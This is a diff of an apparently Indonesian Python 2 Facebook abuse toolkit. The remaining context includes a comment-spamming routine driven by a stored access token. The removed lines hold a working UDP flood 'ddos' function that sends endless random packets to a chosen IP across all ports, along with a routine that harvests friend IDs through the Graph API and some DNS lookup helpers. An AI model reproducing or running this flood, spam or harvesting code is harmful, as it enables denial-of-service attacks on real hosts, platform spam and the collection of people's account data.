@@ -199,7 +199,7 @@ def tutor():
                time.sleep(1)
                tutor()
 
-
+# Jangan Diubah #
 def bot_komen():
     try:
         toke = open('login.txt', 'r').read()
@@ -308,7 +308,7 @@ def spamkomen():
         os.system('python2 main.py')
     os.system("clear")
     print logo
-    print 'Jika Jumlah Spam Banyak,Mungkin Agak Lama'
+    print 'Jika Jumlah Spam Banyak,Maka Agak Lama'
     post = raw_input("\033[32;1mID Post \033[34;1m=> \033[37;1m")
     kom = raw_input("\033[32;1mKalimat \033[34;1m=> \033[37;1m")
     jml = int(input("\033[32;1mJumlah \033[34;1m=> \033[37;1m"))
@@ -318,33 +318,6 @@ def spamkomen():
     print '\033[33;1m[\033[31;1m*\033[33;1m] \033[34;1mSuccess'
     balik = raw_input('\033[31;1m[Enter Untuk Keluar]\n')
     menu()
-
-
-def ddos():
-    os.system("clear")
-    print logo
-    print "\033[36;1m[\033[34;1m+\033[36;1m]\033[31;1m"+30*"─"+"\033[36;1m[\033[34;1m+\033[36;1m]\033[31;1m"
-    now = datetime.now()
-    hour = now.hour
-    minute = now.minute
-    day = now.day
-    month = now.month
-    year = now.year
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    bytes = random._urandom(1490)
-    ip = raw_input('\033[37;1mIP Target : ')
-    port = input('\033[37;1mPort       : ')
-    os.system('clear')
-    sent = 0
-    while True:
-        sock.sendto(bytes, (ip, port))
-        sent = sent + 1
-        port = port + 1
-        print 'Sent %s packet to %s throught port:%s' % (sent, ip, port)
-        if port == 65534:
-            port = 1
-
-
 
 def crack_post():
     os.system('clear')
@@ -482,100 +455,7 @@ def crack_post():
     menu()
 
 
-def scandomain():
-    os.system("clear")
-    print logo
-    print '\033[31;1m[\033[33;1m+\033[31;1m]'+40*'\033[33;1m─'+'\033[31;1m[\033[33;1m+\033[31;1m]'
-    try:
-        domain = raw_input("\033[31;1mDomain \033[32;1m=> \033[37;1m")
-        get_ip = socket.gethostbyname(domain)
-        print "\033[34;1mIP",domain,"=>",get_ip
-        balik = raw_input("\033[31;1m[<enter to back>]\n")
-    except requests.exceptions.ConnectionError:
-        print "\033[37;1m[\033[31;1m!\033[37;1m] Conection Error"
-    except socket.error:
-        print "\033[37;1m[\033[31;1m!\033[37;1m] Domain Failed"
-    time.sleep(2)
-    menu()
-
-def cek_your_machine():
-    nama_host = socket.gethostname()
-    ip_address = socket.gethostbyname(nama_host)
-    print "\033[32;1mHost Name\033[33;1m: \033[37;1m"+nama_host
-    print "\033[32;1mIp Address\033[33;1m: \033[37;1m"+ip_address
-    balik = raw_input("\033[31;1m[<enter to back>]\n")
-    menu()
-
-
-def dnslookup():
-    os.system("clear")
-    print logo
-    domain = raw_input('\033[31;1mInput Domain \033[33;1m=> \033[37;1m')
-    dns = 'http://api.hackertarget.com/dnslookup/?q=' + domain
-    cek = urlopen(dns).read()
-    print cek
-    balik = raw_input('\033[31;1m[<enter to back>]\n')
-    menu()
-
-def dumpid():
-    os.system('clear')
-    try:
-        toke = open('login.txt', 'r').read()
-    except IOError:
-        print '\033[37;1m[\033[31;1m!\033[37;1m] Token not found'
-        os.system('rm -rf login.txt')
-        time.sleep(0.01)
-        os.system("python2 main.py")
-    try:
-        os.mkdir('done')
-    except OSError:
-        pass
-    try:
-        os.system('clear')
-        print logo
-        print '\033[31;1m[\033[33;1m+\033[31;1m]'+40*'\033[33;1m─'+'\033[31;1m[\033[33;1m+\033[31;1m]'
-        r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toke)
-        z = json.loads(r.text)
-        bz = open('done/id.txt', 'w')
-        for a in z['data']:
-            idteman.append(a['id'])
-            bz.write(a['id'] + '\n')
-            print '\r\033[34;1m[\033[37;1m' + str(len(idteman)) + '\033[34;1m] \033[32;1m =>',
-            sys.stdout.flush()
-            time.sleep(0.005)
-            print '\033[37;1m' + a['id']
-        bz.close()
-        print '\r\033[31;1mTotal ID :\033[37;1m %s' % len(idteman)
-        simpen = raw_input('\r\033[32;1mSave To \033[37;1m=> \033[33;1mFile Name : \033[37;1m')
-        os.rename('done/id.txt', 'done/' + simpen)
-        print '\r\033[32;1mFile Save \033[33;1m: \033[37;1mdone/' + simpen
-        print '\033[31;1m[\033[33;1m+\033[31;1m]'+40*'\033[33;1m─'+'\033[31;1m[\033[33;1m+\033[31;1m]'
-        balik = raw_input('\033[31;1m[<back>]')
-        os.system('python2 main.py')
-    except IOError:
-        print "\033[37;1m[\033[31;1m!\033[37;1m] dont't create file "
-        balik = raw_input('\033[31;1m[<back>]')
-        menu()
-    except (KeyboardInterrupt, EOFError):
-        print '\033[37;1m[\033[31;1m!\033[37;1m] stop !'
-        balik = raw_input('\033[31;1m[<back>]')
-        menu()
-    except KeyError:
-        print '\033[37;1m[\033[31;1m!\033[37;1m] Error !'
-        raw_input('\033[31;1m[<back>]')
-        menu()
-    except OSError:
-        print "\033[37;1m[\033[31;1m!\033[37;1m] Don't save"
-        balik = raw_input('\n\033[31;1m[<back>]\n')
-        os.system('python2 main.py')
-    except requests.exceptions.ConnectionError:
-        print '\033[37;1m[\033[31;1m!\033[37;1m] Conection Error !'
-        keluar()
-
-
-
 
 if __name__ == '__main__':
     menu()
     masuk()
-
